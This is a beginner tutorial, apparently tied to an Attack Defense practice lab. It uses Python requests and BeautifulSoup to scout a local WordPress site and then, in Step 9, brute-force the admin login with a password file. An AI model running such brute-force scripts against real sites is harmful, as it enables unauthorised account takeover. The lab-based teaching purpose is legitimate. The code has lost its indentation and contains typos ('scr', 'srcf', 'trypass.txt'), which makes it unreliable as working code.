# Attacking Web Forms with requests and BeautifulSoup in Python

Learn how to work with requests and beautifulsoup4 modules and Python to conduct web attacks. We're going to be using the lab on Attack Defense labs which is a platform to exercise and grow your penetration testing and cybersecurity skills.
Now here we're dealing with a web portal and we need to do some initial recon and then actually brute force authentication all using Python.
There is everything installed for us in the lab and we will be using Jupiter notebooks.

Now to get a very similar scenario to the one that I have here, you could have you could install a virtual machine in VM or virtual box and then install a vulnerable CMS(Content Management Systems) like wordpress, drupal, joomla! etc on the machine like the one we're attacking in this scenario.
And that's all for free.
Or like I'm doing in this case you could get a subscription on attack defense whichever you find the best suitable for you.
Now I'm using a tag defense labs platform for convenience here for no setup and for your better understanding.

Requirements :-
* pip install requests
* pip install beautifulsoup4 ( Used to pull data out from html or xml files.)
* CMS running on port 80 or any.
* Password Dictionary file

Attacking Web Portals - 
A CMS is hosted on port 80 or any port and we are gonna install above requirements and run commands on jupyter notebook

**Step 1** - Check if webportal is up by using GET request.
```python
import requests as r
r.get("http://127.0.0.1")
```
Output - Response [200]

**Step 2** - Print response headers of GET response and find which server is software being used?
```python
req = r.get("http://127.0.0.1")
req.headers
```
Output - Server : ngnix/1.14.0

**Step 3** - Get text content of localhost homepage and also find which CMS is running on local host.
```python
req.content ( or req.text ) 
```
Output - An html code of the localhost homepage appears. In title section, find the CMS running like wordpress.

**Step 4** - Print the response in a pretty form using beautifulsoup4
```python
from bs4 import BeautifulSoup as bs
soup = bs(req.content, "html.parser")
#if above one doesnt work, try req.text
print(soup.prettify())
```
Output - Same html code but pretty

**Step 5** - Print the title of the web portal hosted on localhost
```python
print(soup.title)
```
Output - Title WordPress

**Step 6** - Print the URLs present on homepage
```python
homepage = r.get("http://127.0.0.1")
soup = bs(homepage.content, "html.parser")
imgs = soup.find_all("img", scr=True)            # all images ("img") tags are collected. <img src="smt">
imgs_src = []
for img in imgs:
imgs_src.append(img['srcf'])
imgs_set = set(imgs_src)                  # to get unique elements, set() is used.
for img in imgs_set:
print(img)
```
Ouput - Prints urls of all the images.

**Step 7** - Scrape all URLs from homepage and print unique URLs.
```python
homepage = r.get("http://127.0.0.1")
soup = bs(homepage.content, "html.parser")
urls = soup.find_all("a", href=True)            # all anchor ("a") tags are collected. <a href="smt">
urls_href = []
for url in urls:
urls_href.append(url['href'])
urls_set = set(urls_href)                  # to get unique elements, set() is used.
for url in urls_set:
print(url)
```
Output - Prints all urls present on homepage.

**Step 8** - Can you access the admin (/wp-admin/) of the CMS? (wordpress here)
```python
admin = r.get("http://127.0.0.1/wp-admin/")
soup_admin = bs(admin.content, "html.parser")
print(soup_admin.prettify())
```
Output - prints content of admin page in a pretty way.

Attack steps -
**Step 9** - Bruteforce the wordpress login with user "admin" using password file.
```python
passfile = "password.txt"
with open(passfile, "r") as f:
for word in f:
word = word.strip("\n")
trypass = r.post("http://127.0.0.1/wp-login.php", data={ "log":"admin", "pwd":word})  

# here log and pwd were used as input "name" for userid and password

if "ERROR" not in trypass.txt:
print("Success, pwd is", word)
break
else:
print("wrong pwd", word)
```
Output - Print correct and wrong password for name admin.

**Step 10** - A token is kept at page localhost/token/index.html by user "anon" but the page is protected. what kind of protection is deployed?

**Step 11** - Break the protection and get token.

### Platforms/Web Apps to practice skills:
 
http://hackthebox.eu
 
http://tryhackme.com/
 
https://www.root-me.org/?lang=en
 
https://information.rapid7.com/metasploit-framework.html
 
http://www.dvwa.co.uk/
 
http://attackdefense.com/
    